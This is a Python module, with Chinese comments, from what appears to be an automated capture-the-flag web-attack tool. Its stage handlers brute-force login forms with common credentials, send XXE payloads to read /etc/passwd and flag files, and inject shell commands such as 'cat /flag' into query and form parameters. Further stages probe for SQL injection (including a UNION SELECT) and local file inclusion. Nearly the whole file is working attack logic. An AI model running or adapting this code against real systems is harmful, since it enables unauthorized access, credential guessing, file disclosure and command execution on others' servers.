"""yang_web.core.multi_stage._engine 混入 _Stages —— 基础阶段处理器（弱口令 / XXE / RCE / 兜底）。"""

from __future__ import annotations
import re
import base64
import urllib.request
import urllib.error
import urllib.parse
from urllib.parse import urljoin
from typing import Dict, List, Optional, Tuple, Set, Callable
from ._common import (COMMON_CREDENTIALS, FLAG_RE, LFI_PAYLOADS, XXE_PAYLOADS)

class _Stages:
    """基础阶段处理器（弱口令 / XXE / RCE / 兜底）。"""


    # ── Stage Handlers ──

    def _stage_login(self, url: str, resp: dict, analysis: dict,
                     _emit, _found) -> Optional[str]:
        """登录阶段: 弱口令爆破."""
        _emit("attack", "弱口令爆破", f"Top {min(20, len(COMMON_CREDENTIALS))} 凭据...")

        form_action = url
        if analysis["forms"]:
            first_form = analysis["forms"][0]
            if first_form["action"]:
                form_action = urljoin(url, first_form["action"])
            form_method = first_form.get("method", "POST")
            _emit("attack", "表单识别", f"method={form_method} action={form_action}")

        for username, password in COMMON_CREDENTIALS[:20]:
            if self._cancelled:
                break

            data = urllib.parse.urlencode({
                "username": username,
                "password": password,
            }).encode()

            resp2 = self.http.request(form_action, method="POST", data=data)
            body2 = resp2.get("body", "")

            # 判断登录成功
            fail_keywords = ["invalid", "wrong password", "密码错误", "用户名错误",
                           "incorrect", "login fail", "denied", "用户名或密码",
                           "not found", "doesn't exist"]
            success_keywords = ["successful", "成功", "welcome", "登录成功", "dashboard",
                               "congrat", "flag{", "你的flag", "your flag"]
            # 先检查失败标志
            body_lower = body2.lower()
            is_fail = any(kw in body_lower for kw in fail_keywords)
            # 再检查成功标志
            is_success = any(kw in body_lower for kw in success_keywords) or \
                         bool(re.search(r"(?:successful|成功|welcome|登录成功|dashboard)", body2, re.I))
            # 响应中缺少"Try to Login"(登录页标志)也可能是登录成功
            no_login_hint = "try to login" not in body_lower and "Invaild" not in body2
            # 长度显著变化(>100B)也可能是成功
            len_changed = abs(len(body2) - len(resp.get("body", ""))) > 100

            login_ok = (is_success or no_login_hint or len_changed) and not is_fail

            if login_ok:
                _emit("cred_found", f"{username}:{password}", "✅ 登录成功!")

                # 提取 JS 重定向
                analysis2 = self.analyzer.analyze(body2, form_action)
                if analysis2["redirects"]:
                    next_url = analysis2["redirects"][0]
                    if not next_url.startswith("http"):
                        next_url = urljoin(form_action, next_url)
                    _emit("redirect", next_url[:60], "登录后重定向")
                    return next_url

                # 检查 flag
                flag = FLAG_RE.search(body2)
                if flag:
                    _found(flag.group(0))
                    return None

                # 链接发现
                links = re.findall(r'href\s*=\s*["\']([^"\']+)', body2, re.I)
                for link in links:
                    if link not in ("#", "javascript:void(0)") and ".php" in link:
                        next_url = urljoin(form_action, link)
                        if next_url != url and next_url != form_action:
                            return next_url
                return None  # Login succeeded but no obvious next step

            # 如果 body 长度变化 > 50B，也可能是登录成功
            if abs(len(body2) - len(resp.get("body", ""))) > 50:
                _emit("cred_try", f"{username}:{password}",
                      f"len_diff={len(body2)-len(resp.get('body',''))}")

        _emit("attack", "弱口令爆破", "未找到有效凭据")
        return None

    def _stage_xxe(self, url: str, resp: dict, analysis: dict,
                   _emit, _found) -> Optional[str]:
        """XXE 阶段: 尝试读 /flag."""
        _emit("attack", "XXE 攻击", "尝试读取服务器文件...")

        for name, payload in XXE_PAYLOADS.items():
            if self._cancelled:
                break

            resp2 = self.http.request(url, method="POST",
                data=payload.encode(),
                headers={"Content-Type": "application/xml"})

            body2 = resp2.get("body", "")

            # Flag 检测
            flag = FLAG_RE.search(body2)
            if flag:
                _found(flag.group(0))
                _emit("xxe_hit", name, flag.group(0)[:40])
                return None

            # /etc/passwd 验证 XXE 是否生效
            if "root:x:" in body2:
                _emit("xxe_confirmed", name, "XXE 生效! /etc/passwd 可读")
                # 如果 XXE 生效但还没读到 flag，尝试 PHP filter
                resp3 = self.http.request(url, method="POST",
                    data=XXE_PAYLOADS["php_filter_flag"].encode(),
                    headers={"Content-Type": "application/xml"})
                body3 = resp3.get("body", "")
                flag2 = FLAG_RE.search(body3)
                if flag2:
                    _found(flag2.group(0))
                # 尝试 base64 解码
                b64 = re.search(r'[A-Za-z0-9+/=]{40,}', body3)
                if b64 and 'DOCTYPE' not in body3:
                    import base64
                    try:
                        decoded = base64.b64decode(b64.group(0)).decode()
                        flag3 = FLAG_RE.search(decoded)
                        if flag3:
                            _found(flag3.group(0))
                    except Exception:
                        pass
                return None

            # 检查响应是否不同于原始页面（XXE 可能有效但没有标准的文件内容）
            if len(body2) != resp.get("body_len", 0):
                _emit("xxe_test", name, f"响应长度变化: {len(body2)-resp.get('body_len',0)}B")

        return None

    def _stage_rce(self, url: str, resp: dict, analysis: dict,
                   _emit, _found) -> Optional[str]:
        """RCE 阶段: 命令注入探测."""
        _emit("attack", "RCE 探测", "命令注入...")

        cmds = [
            "cat /flag", "cat /flag.txt", "cat /var/www/html/flag",
            "cat /fla*", "cat /f*", "tac /flag",
            "nl /flag", "head -n 50 /flag",
        ]

        for param in analysis.get("inputs", ["cmd", "command", "ip"]):
            if self._cancelled:
                break
            for cmd in cmds:
                test_url = f"{url}?{param}={urllib.parse.quote(cmd)}"
                resp2 = self.http.request(test_url)
                body2 = resp2.get("body", "")
                flag = FLAG_RE.search(body2)
                if flag:
                    _found(flag.group(0))
                    return None
                # RCE 成功标志
                if re.search(r'(?:uid=|root:|bin/)', body2):
                    _emit("rce_hit", param, f"命令执行成功!")
                    return None

        # POST 探测
        if analysis["forms"]:
            for form_data in analysis["forms"]:
                for param in form_data.get("inputs", []):
                    for cmd in cmds[:3]:
                        data = urllib.parse.urlencode({param: cmd}).encode()
                        resp2 = self.http.request(url, method="POST", data=data)
                        flag = FLAG_RE.search(resp2.get("body", ""))
                        if flag:
                            _found(flag.group(0))
                            return None

        return None

    def _stage_generic(self, url: str, resp: dict, analysis: dict,
                       _emit, _found) -> Optional[str]:
        """通用攻击: SQLi盲注 + 文件探测 + 跳转跟随."""
        _emit("attack", "通用攻击", "SQLi+XSS+文件探测...")

        # 1. SQLi 快速探测
        sqli_probes = ["'", '"', "1' OR '1'='1", "1' AND 1=1--"]
        for param in analysis.get("inputs", ["id", "page", "q", "search"]):
            if self._cancelled:
                break
            for probe in sqli_probes[:2]:  # 仅快速探测
                test_url = f"{url}?{param}={urllib.parse.quote(probe)}"
                resp2 = self.http.request(test_url)
                body2 = resp2.get("body", "")
                # 检查 SQL 错误
                if re.search(r'(?:sql|syntax|mysql|sqlite|warning)', body2, re.I):
                    _emit("sqli_hint", param, f"SQL 错误泄露")
                    # 尝试 UNION
                    union = f"' UNION SELECT 1,flag,3 FROM flag-- "
                    resp3 = self.http.request(f"{url}?{param}={urllib.parse.quote(union)}")
                    body3 = resp3.get("body", "")
                    flag = FLAG_RE.search(body3)
                    if flag:
                        _found(flag.group(0))
                        return None

        # 2. 文件读取探测 (LFI)
        for param in analysis.get("inputs", ["file", "page", "include", "path"]):
            for lfi_path in LFI_PAYLOADS[:4]:
                test_url = f"{url}?{param}={urllib.parse.quote(lfi_path)}"
                resp2 = self.http.request(test_url)
                body2 = resp2.get("body", "")
                flag = FLAG_RE.search(body2)
                if flag:
                    _found(flag.group(0))
                    return None

        # 3. 跳转提取 (已经在 solve() 主循环中处理)
        return None
